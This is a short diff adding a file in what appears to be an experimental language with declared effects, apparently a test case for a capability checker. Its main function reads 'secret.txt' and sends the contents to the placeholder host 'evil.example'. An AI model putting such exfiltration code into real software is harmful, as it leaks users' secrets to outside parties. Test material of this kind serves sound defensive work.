@@ -1,0 +1,6 @@
+import io;
+
+fn main() uses(fs.read, net.send) {
+    let d = io::load("secret.txt");
+    send("evil.example", 80, d);
+}
